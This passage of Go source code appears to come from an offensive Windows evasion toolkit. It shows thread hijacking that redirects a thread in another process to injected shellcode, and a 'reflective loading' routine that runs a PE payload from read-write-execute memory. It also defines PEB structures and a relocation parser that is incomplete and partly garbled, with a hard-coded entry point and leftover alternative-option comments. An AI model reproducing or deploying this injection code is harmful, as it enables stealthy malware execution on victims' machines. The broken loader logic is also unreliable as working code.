				)

				// Suspend thread
				suspendCount, _, _ := suspendThread.Call(hThread)
				if suspendCount != 0xFFFFFFFF {
					fmt.Printf("[+] Thread suspended (Thread ID: %d, Suspend Count: %d)\n", te32.ThreadID, suspendCount)

					// Get thread context
					var ctx CONTEXT
					ctx.ContextFlags = 0x10007 // CONTEXT_FULL value

					_, _, _ = getThreadContext.Call(
						hThread,
						uintptr(unsafe.Pointer(&ctx)),
					)

					// Save original RIP value
					originalRip := ctx.Rip
					fmt.Printf("[+] Original RIP: 0x%X\n", originalRip)

					// Set RIP value to shellcode address
					ctx.Rip = uint64(remoteAddr)

					// Update thread context
					_, _, _ = setThreadContext.Call(
						hThread,
						uintptr(unsafe.Pointer(&ctx)),
					)

					// Resume thread
					_, _, _ = resumeThread.Call(hThread)

					windows.CloseHandle(windows.Handle(hThread))
					threadHijacked = true
					fmt.Printf("[+] Thread hijacked (Thread ID: %d)\n", te32.ThreadID)
					break
				} else {
					windows.CloseHandle(windows.Handle(hThread))
				}
			}
		}

		// Next thread
		ret, _, _ = thread32Next.Call(
			hSnapshot,
			uintptr(unsafe.Pointer(&te32)),
		)

		if ret == 0 {
			break
		}
	}

	if !threadHijacked {
		return fmt.Errorf("no thread hijacked")
	}

	fmt.Println("[+] Thread Hijacking applied successfully")
	fmt.Println("[*] NOTE: Target process is now running with hijacked thread")
	return nil
}

// WEM5: Reflective Loading technique
func (e *WindowsEvasion) reflectiveLoading(payload []byte) error {
	fmt.Println("[*] Reflective Loading is being applied...")

	// Load required DLLs
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	// Get required functions
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	createThread := kernel32.NewProc("CreateThread")
	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	// 1. Check PE header
	if len(payload) < 0x40 || payload[0] != 'M' || payload[1] != 'Z' {
		return fmt.Errorf("invalid PE file")
	}

	// 2. Allocate memory (RWX)
	addr, _, _ := virtualAlloc.Call(
		0,
		uintptr(len(payload)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)

	if addr == 0 {
		return fmt.Errorf("memory allocation failed")
	}

	// 3. Copy DLL to memory
	copyMemory(unsafe.Pointer(addr), payload)

	// 4. Find DLL's entry point (simplified)
	// NOTE: In a real implementation, you need to parse the PE header and find the entry point
	entryPoint := addr + 0x1000 // Example entry point

	// 5. Run DLL
	threadHandle, _, _ := createThread.Call(
		0,
		0,
		entryPoint,
		addr, // DLL base address parameter
		0,
		0,
	)

	if threadHandle == 0 {
		return fmt.Errorf("thread creation failed")
	}

	// 6. Wait for thread to complete
	waitForSingleObject.Call(
		threadHandle,
		0xFFFFFFFF, // INFINITE
	)

	// 7. Close thread handle
	windows.CloseHandle(windows.Handle(threadHandle))

	fmt.Println("[+] Reflective Loading applied successfully")
	return nil
}

func copyMemory(dest unsafe.Pointer, payload []byte) {
	for i := 0; i < len(payload); i++ {
		*(*byte)(unsafe.Pointer(uintptr(dest) + uintptr(i))) = payload[i]
	}
}

// Define PEB structure correctly
type PEB struct {
	Reserved1              [2]byte
	BeingDebugged          byte
	Reserved2              byte
	Reserved3              [2]uintptr
	Ldr                    uintptr
	ProcessParameters      uintptr
	Reserved4              [3]uintptr
	AtlThunkSListPtr       uintptr
	Reserved5              uintptr
	Reserved6              uint32
	Reserved7              uintptr
	Reserved8              uint32
	AtlThunkSListPtr32     uint32
	Reserved9              [45]uintptr
	Reserved10             [96]byte
	PostProcessInitRoutine uintptr
	Reserved11             [128]byte
	Reserved12             [1]uintptr
	SessionId              uint32
}

// PEB_LDR_DATA structure
type PEB_LDR_DATA struct {
	Length                          uint32
	Initialized                     uint32
	SsHandle                        uintptr
	InLoadOrderModuleList           LIST_ENTRY
	InMemoryOrderModuleList         LIST_ENTRY
	InInitializationOrderModuleList LIST_ENTRY
}

// LIST_ENTRY structure
type LIST_ENTRY struct {
	Flink uintptr
	Blink uintptr
}

// Process relocation table
func processRelocationTable(peFile *pe.File, baseAddress uintptr, preferredBase uintptr) error {
	var relocSection *pe.Section
	for _, section := range peFile.Sections {
		if section.Name == ".reloc" {
			relocSection = section
			break
		}
	}

	if relocSection == nil {
		return nil // Relocation table not found
	}

	relocData, err := relocSection.Data()
	if err != nil {
		return err
	}

	// Calculate delta (new base address - preferred base address)
	delta := int64(baseAddress) - int64(preferredBase)
	if delta == 0 {
		return nil // Relocation not needed
	}

	// Process relocation entries
	offset := 0
	for offset < len(relocData) {
		// Read block header
		blockRVA := binary.LittleEndian.Uint32(relocData[offset:])
		blockSize := binary.LittleEndian.Uint32(relocData[offset+4:])

		if blockRVA == 0 || blockSize == 0 {
			break
		}

		// Process relocation entries
		entriesCount := (blockSize - 8) / 2
		for i := uint32(0); i < entriesCount; i++ {
			entryOffset := offset + int(i*2) + 8
			entry := binary.LittleEndian.Uint16(relocData[entryOffset : entryOffset+2])
			type_ := entry >> 12
			offset_ := entry & 0xFFF

			if type_ == 0 {
				continue // Fill entry
			}

			// Address correction
			rva := blockRVA + uint32(offset_)
			fmt.Printf("[+] Relocation: RVA 0x%X\n", rva)

			// OR

			// Option 2: Define variable with underscore (not used)
			_ = blockRVA + uint32(offset_)
		}

		offset += int(blockSize)
	}

	return nil
}
